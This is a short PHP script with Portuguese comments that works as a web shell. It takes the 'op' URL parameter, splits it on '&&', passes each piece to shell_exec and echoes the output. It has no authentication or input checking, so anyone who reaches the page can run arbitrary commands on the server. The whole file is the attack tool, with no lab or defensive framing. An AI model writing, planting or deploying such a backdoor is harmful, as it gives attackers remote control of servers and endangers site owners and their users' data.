<?php
// Função para executar comandos
function executeCommands($commands) {
    // Verifica o sistema operacional
    $os = strtolower(PHP_OS);
    $isWindows = strpos($os, 'win') === 0;

    // Separa os comandos usando &&
    $commandList = explode('&&', $commands);

    // Array para armazenar os resultados
    $results = [];

    // Executa cada comando
    foreach ($commandList as $command) {
        // Remove espaços extras do comando
        $command = trim($command);
        
        // Verifica se o comando não está vazio
        if (!empty($command)) {
            // Executa o comando e captura a saída
            if ($isWindows) {
                // Windows
                $output = shell_exec($command);
            } else {
                // Linux
                $output = shell_exec($command . ' 2>&1'); // Redireciona stderr para stdout
            }

            // Adiciona a saída ao array de resultados
            $results[] = $output;
        }
    }

    // Retorna os resultados como string
    return implode("\n", $results);
}

// Obtém o parâmetro 'op'
if (isset($_GET['op'])) {
    $commands = $_GET['op'];
    $result = executeCommands($commands);

    // Mostra os resultados
    echo "<pre>$result</pre>";
} else {
    echo "Parâmetro 'op' não fornecido.";
}
?>
